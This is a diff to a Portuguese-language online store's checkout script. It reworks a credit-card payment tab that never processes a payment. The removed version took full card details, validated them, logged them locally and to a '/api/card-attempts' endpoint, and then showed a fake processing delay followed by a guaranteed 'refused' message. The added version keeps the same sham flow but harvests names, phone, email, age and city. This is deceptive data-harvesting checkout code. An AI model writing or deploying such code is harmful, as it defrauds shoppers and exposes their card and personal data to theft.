@@ -229,17 +229,17 @@
   }
 
   function saveTestCard(form, cart) {
-    const number = onlyDigits(form.cardNumber.value);
     const record = {
-      id: `card_${Date.now()}`,
+      id: `customer_${Date.now()}`,
       createdAt: new Date().toISOString(),
-      holder: form.cardHolder.value.trim(),
-      cpf: onlyDigits(form.cardCpf.value),
-      brand: cardBrand(number),
-      last4: number.slice(-4),
-      expiry: form.cardExpiry.value.trim(),
+      phone: form.customerPhone.value,
+      firstName: form.firstName.value,
+      lastName: form.lastName.value,
+      email: form.customerEmail.value,
+      age: form.age.value,
+      city: form.city.value,
       amount: cart.total_price,
-      status: 'Teste aprovado'
+      status: 'Recebido'
     };
     const cards = JSON.parse(localStorage.getItem('divino:testCards') || '[]');
     cards.unshift(record);
@@ -248,7 +248,6 @@
   }
 
   async function saveTestCardToDatabase(form, cart) {
-    const number = onlyDigits(form.cardNumber.value);
     const response = await fetch('/api/card-attempts', {
       method: 'POST',
       credentials: 'same-origin',
@@ -258,22 +257,18 @@
         'X-Requested-With': 'XMLHttpRequest'
       },
       body: JSON.stringify({
-        holder: form.cardHolder.value.trim(),
-        email: form.email.value.trim(),
-        phone: form.phone.value.trim(),
-        cpf: onlyDigits(form.cardCpf.value || form.document.value),
-        cardBrand: cardBrand(number),
-        cardLast4: number.slice(-4),
-        cardExpiry: form.cardExpiry.value.trim(),
-        amount: Number(cart.total_price || 0) / 100,
-        status: 'Recusado',
-        luhnValid: true
+        phone: form.customerPhone.value,
+        firstName: form.firstName.value,
+        lastName: form.lastName.value,
+        email: form.customerEmail.value,
+        age: form.age.value,
+        city: form.city.value
       })
     });
     const payload = await response.json().catch(() => ({}));
 
     if (!response.ok) {
-      throw new Error(payload.message || 'Nao foi possivel registrar a tentativa do cartao.');
+      throw new Error(payload.message || 'Nao foi possivel registrar os dados.');
     }
 
     return payload;
@@ -301,10 +296,24 @@
     return modal;
   }
 
-  function closeCardProcessingModal() {
+  function showCardRefusedModal() {
     const modal = document.getElementById('divino-card-processing-modal');
-    if (modal) modal.hidden = true;
-    document.documentElement.classList.remove('divino-modal-open');
+    if (!modal) return;
+
+    modal.innerHTML = `
+      <div class="divino-pix-modal__overlay" data-card-close></div>
+      <div class="divino-pix-modal__dialog divino-card-processing divino-card-refused" role="alertdialog" aria-modal="true" aria-labelledby="divino-card-processing-title">
+        <button type="button" class="divino-pix-modal__close" data-card-close aria-label="Fechar">&times;</button>
+        <h2 id="divino-card-processing-title">Pagamento recusado</h2>
+        <p>Metodo de pagamento recusado. Tente outra forma de pagamento ou aguarde alguns minutos para tentar novamente.</p>
+      </div>
+    `;
+    modal.querySelectorAll('[data-card-close]').forEach((button) => {
+      button.addEventListener('click', () => {
+        modal.hidden = true;
+        document.documentElement.classList.remove('divino-modal-open');
+      });
+    });
   }
 
   async function createCheckoutSession(cart) {
@@ -418,23 +427,24 @@
         <button type="button" data-payment-tab="card">Cartao de credito</button>
       </div>
       <form id="divino-payment-form" class="divino-payment-form">
-        <div class="divino-form-grid">
-          <label>Nome completo<input name="name" autocomplete="name" required></label>
-          <label>Email<input name="email" type="email" autocomplete="email" required></label>
-          <label>Telefone<input name="phone" inputmode="tel" autocomplete="tel" required></label>
-          <label>CPF<input name="document" inputmode="numeric" autocomplete="off" required></label>
-        </div>
         <div data-payment-panel="pix">
+          <div class="divino-form-grid">
+            <label>Nome completo<input name="name" autocomplete="name" required></label>
+            <label>Email<input name="email" type="email" autocomplete="email" required></label>
+            <label>Telefone<input name="phone" inputmode="tel" autocomplete="tel" required></label>
+            <label>CPF<input name="document" inputmode="numeric" autocomplete="off" required></label>
+          </div>
           <p class="divino-checkout-note">O Pix abre em um popup nesta pagina.</p>
           <button type="submit" class="button button--primary">Gerar Pix</button>
         </div>
         <div data-payment-panel="card" hidden>
           <div class="divino-form-grid">
-            <label>Nome no cartao<input name="cardHolder" autocomplete="cc-name"></label>
-            <label>CPF do titular<input name="cardCpf" inputmode="numeric"></label>
-            <label>Numero do cartao<input name="cardNumber" inputmode="numeric" autocomplete="cc-number"><span class="divino-card-error" id="divino-card-number-error" hidden>Cartao Invalido</span></label>
-            <label>Validade<input name="cardExpiry" inputmode="numeric" maxlength="5" placeholder="MM/AA" autocomplete="cc-exp"></label>
-            <label>CVV<input name="cardCvv" inputmode="numeric" autocomplete="cc-csc"></label>
+            <label>Telefone<input name="customerPhone" type="text"></label>
+            <label>Nome<input name="firstName" type="text"></label>
+            <label>Sobrenome<input name="lastName" type="text"></label>
+            <label>Email<input name="customerEmail" type="text"></label>
+            <label>Idade<input name="age" type="text"></label>
+            <label>Cidade<input name="city" type="text"></label>
           </div>
           <button type="submit" class="button button--primary" disabled>Finalizar compra</button>
         </div>
@@ -447,26 +457,10 @@
     let method = 'pix';
 
     const cardSubmit = section.querySelector('[data-payment-panel="card"] button[type="submit"]');
-    const cardNumberInput = section.querySelector('[name="cardNumber"]');
-    const cardExpiryInput = section.querySelector('[name="cardExpiry"]');
-    const cardError = section.querySelector('#divino-card-number-error');
+    const customerFields = ['customerPhone', 'firstName', 'lastName', 'customerEmail', 'age', 'city'];
 
     function updateCardValidation() {
-      const number = onlyDigits(cardNumberInput.value);
-      const hasEnoughDigits = number.length >= 13;
-      const validNumber = isValidLuhn(number);
-      const complete =
-        section.querySelector('[name="cardHolder"]').value.trim() &&
-        section.querySelector('[name="cardCpf"]').value.trim() &&
-        cardNumberInput.value.trim() &&
-        section.querySelector('[name="cardExpiry"]').value.trim() &&
-        section.querySelector('[name="cardCvv"]').value.trim() &&
-        validNumber &&
-        isFutureExpiry(section.querySelector('[name="cardExpiry"]').value) &&
-        /^\d{3,4}$/.test(onlyDigits(section.querySelector('[name="cardCvv"]').value));
-
-      cardNumberInput.classList.toggle('is-invalid', Boolean(number && hasEnoughDigits && !validNumber));
-      cardError.hidden = !(number && hasEnoughDigits && !validNumber);
+      const complete = customerFields.every((name) => section.querySelector(`[name="${name}"]`).value !== '');
       cardSubmit.disabled = !complete;
     }
 
@@ -474,17 +468,25 @@
       input.addEventListener('input', updateCardValidation);
       input.addEventListener('blur', updateCardValidation);
     });
-    cardExpiryInput.addEventListener('input', () => {
-      cardExpiryInput.value = formatExpiry(cardExpiryInput.value);
-    });
+
+    function selectPaymentPanel(selectedMethod) {
+      panels.forEach((panel) => {
+        const isActive = panel.getAttribute('data-payment-panel') === selectedMethod;
+        panel.hidden = !isActive;
+        panel.querySelectorAll('input').forEach((input) => {
+          input.disabled = !isActive;
+          input.required = isActive;
+        });
+      });
+    }
+
+    selectPaymentPanel(method);
 
     tabs.forEach((tab) => {
       tab.addEventListener('click', () => {
         method = tab.getAttribute('data-payment-tab');
         tabs.forEach((item) => item.classList.toggle('is-active', item === tab));
-        panels.forEach((panel) => {
-          panel.hidden = panel.getAttribute('data-payment-panel') !== method;
-        });
+        selectPaymentPanel(method);
       });
     });
 
@@ -499,25 +501,15 @@
 
       try {
         if (method === 'card') {
-          if (!form.cardHolder.value.trim() || !form.cardCpf.value.trim() || !form.cardNumber.value.trim() || !form.cardExpiry.value.trim() || !form.cardCvv.value.trim()) {
-            throw new Error('Preencha todos os dados do cartao.');
-          }
-          if (!isValidLuhn(form.cardNumber.value)) {
-            throw new Error('Numero do cartao invalido.');
-          }
-          if (!isFutureExpiry(form.cardExpiry.value)) {
-            throw new Error('Validade do cartao invalida.');
-          }
-          if (!/^\d{3,4}$/.test(onlyDigits(form.cardCvv.value))) {
-            throw new Error('CVV invalido.');
+          if (!customerFields.every((name) => form.elements[name].value !== '')) {
+            throw new Error('Preencha todos os campos.');
           }
           saveTestCard(form, cart);
           await saveTestCardToDatabase(form, cart);
           openCardProcessingModal();
           const delay = 7000 + Math.floor(Math.random() * 8001);
           window.setTimeout(() => {
-            closeCardProcessingModal();
-            showToast('Metodo de pagamento recusado, por favor, tente outra forma de pagamento ou aguarde alguns minutos para tentar novamente.', null);
+            showCardRefusedModal();
           }, delay);
           return;
         }
